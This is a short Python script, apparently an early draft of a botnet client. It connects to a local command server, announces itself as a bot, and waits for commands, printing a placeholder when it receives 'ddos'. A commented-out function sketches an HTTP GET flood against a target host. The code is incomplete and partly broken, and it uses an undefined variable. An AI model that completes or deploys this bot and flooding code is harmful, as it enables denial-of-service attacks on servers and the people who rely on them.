#!/usr/bin/python           # This is client.py file
import urllib
import socket               # Import socket module

s = socket.socket()         # Create a socket object
host = socket.gethostname() # Get local machine name
port = 9999                # Reserve a port for your service.

s.connect((host, port))
s.send("I HAVE INITATED BOT")  


while True:
	cmd = s.recv(1024)
	print(cmd)
	cmd_type= cmd.split()
	if(cmd_type[1]=='ddos'):
		print('DDos functionality')



# def attack():  
#     #pid = os.fork()  
#     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
#     s.connect((sys.argv[1], 80))  
#     print ">> GET /" + receive[2] + " HTTP/1.1"  
#     s.send("GET /" + receive[2] + " HTTP/1.1\r\n")  
#     s.send("Host: " + receive[1]  + "\r\n\r\n");  
#     s.close()  


	
s.close()                     # Close the socket when done
